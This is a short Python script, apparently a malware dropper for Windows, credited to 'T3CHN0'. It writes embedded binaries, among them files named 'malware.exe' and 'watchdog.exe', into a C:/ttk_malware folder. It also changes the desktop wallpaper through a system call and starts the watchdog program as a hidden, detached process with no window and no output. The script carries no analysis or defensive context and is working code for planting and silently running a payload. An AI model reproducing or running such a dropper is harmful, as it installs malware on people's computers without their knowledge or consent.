# This script made completely by T3CHN0

import os
import subprocess
import shutil
import ctypes
from bin_data_ttk import *

def write_bin(file_name, data):
  with open(file_name, "wb") as f:
    f.write(data)

os.chdir("C:/")
list_dir = os.listdir()
if "ttk_malware" in list_dir:
  shutil.rmtree("ttk_malware")

os.mkdir("ttk_malware")
os.chdir("ttk_malware")

write_bin("img1.png", img1)             # IMG1
write_bin("img2.png", img2)             # IMG2
write_bin("malware.exe", malware_exe)   # malware
write_bin("watchdog.exe", watchdog_exe) # watchdog
write_bin("bg_img.jpg", bg_img)         # desktop wallpaper

image_path = R"C:\ttk_malware\bg_img.jpg"
ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
os.remove(image_path)

DETACHED_PROCESS  = 0x00000008
CREATE_NEW_PROCESS_GROUP = 0x00000200
CREATE_NO_WINDOW = 0x08000000

cmd = [R"C:\ttk_malware\watchdog.exe", "arg1", "arg2"]

subprocess.Popen(
    cmd,
    creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
    stdin=subprocess.DEVNULL,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    close_fds=True
)